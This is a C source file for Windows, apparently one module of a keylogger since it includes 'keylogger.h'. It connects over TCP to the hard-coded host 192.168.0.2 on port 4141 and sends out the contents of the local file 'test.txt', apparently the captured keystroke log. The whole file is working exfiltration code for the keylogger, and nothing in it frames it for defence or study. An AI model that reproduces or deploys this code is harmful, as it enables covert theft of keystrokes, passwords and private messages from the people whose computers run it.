#include "keylogger.h"

SOCKET	init_socket(SOCKET my_sock)
{
	struct addrinfo *ptr, *result, hints;

	SecureZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	if (getaddrinfo("192.168.0.2", "4141", &hints, &ptr) != 0)
	{
		printf("getaddrinfo failed\n");
		return (my_sock);
	}
	for (result = ptr; result != NULL; result = result->ai_next)
	{
		if ((my_sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET)
		{
			printf("socket failed\n");
			return (my_sock);
		}
		if (connect(my_sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
		{
			closesocket(my_sock);
			my_sock = INVALID_SOCKET;
			continue;
		}
		break;
	}
	freeaddrinfo(result);
	return (my_sock);
}

void	send_data(SOCKET my_sock)
{
	char buf[BUFFSIZE];
	FILE *fd;
	int i;

	i = 0;
	if (my_sock == INVALID_SOCKET)
		return;
	if ((_wfopen_s(&fd, L"test.txt", L"r")) != 0)
	{
		printf("failed _wfopen_s\n");
		return;
	}
	while ((i = _read(_fileno(fd), buf, BUFFSIZE)) > 0)
	{
		if (send(my_sock, buf, i, 0) == SOCKET_ERROR)
		{
			printf("failed send\n");
			closesocket(my_sock);
			return;
		}
		printf("%s\n", buf);
	}
	if (shutdown(my_sock, SD_SEND) == SOCKET_ERROR)
	{
		printf("failed shutdown\n");
		closesocket(my_sock);
		return;
	}
	SecureZeroMemory(buf, BUFFSIZE);
	while (recv(my_sock, buf, BUFFSIZE, 0) > 0)
	{
		printf("%s\n", buf);
	}
	fclose(fd);
}